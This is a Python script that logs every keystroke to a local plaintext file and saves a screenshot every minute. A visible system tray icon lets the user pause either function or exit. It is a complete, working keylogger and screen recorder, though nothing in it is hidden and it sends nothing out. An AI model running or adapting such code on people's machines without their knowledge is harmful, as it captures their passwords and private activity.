# storing key logged
# taking screenshot in every minute
# pause and resume the screenshot and key logged 


import pyautogui
import time
import threading
from pynput import keyboard
from pystray import Icon, Menu, MenuItem
from PIL import Image, ImageDraw

# Global flags
is_running = True  # To control screenshot taking
listener_running = True  # To control keylogging

# Function to take a screenshot
def take_screenshot():
    while True:
        if is_running:
            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            pyautogui.screenshot(filename)
            print(f"Screenshot saved: {filename}")
        time.sleep(60)  # Change interval as needed

# Function to log keystrokes
def on_press(key):
    if listener_running:
        try:
            with open("key_log.txt", "a") as log_file:
                log_file.write(f"{key.char}")
        except AttributeError:
            with open("key_log.txt", "a") as log_file:
                log_file.write(f"[{key}]")

# Dynamic menu item states
def is_screenshot_running(item):
    return is_running

def is_keylogging_running(item):
    return listener_running

# Function to toggle screenshot taking
def toggle_screenshots(icon, item):
    global is_running
    is_running = not is_running

# Function to toggle keylogging
def toggle_keylogging(icon, item):
    global listener_running
    listener_running = not listener_running

# Function to stop the script
def stop_script(icon, item):
    global listener
    icon.stop()  # Stops the tray icon
    listener.stop()  # Stops the keylogger
    print("Script stopped.")
    exit(0)

# Function to create the system tray icon
def create_tray_icon():
    # Create an icon image
    icon_image = Image.new("RGB", (64, 64), color=(255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 0, 255))

    # Define menu items with dynamic checkmarks
    menu = Menu(
        MenuItem(
            "Pause/Resume Screenshots", 
            toggle_screenshots, 
            checked=is_screenshot_running
        ),
        MenuItem(
            "Pause/Resume Keylogging", 
            toggle_keylogging, 
            checked=is_keylogging_running
        ),
        MenuItem("Exit", stop_script)
    )

    # Create and run the icon
    icon = Icon("Screenshot Logger", icon_image, "Screenshot Logger", menu)
    icon.run()

# Start keylogger in a separate thread
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Start screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()

# Start system tray icon
create_tray_icon()
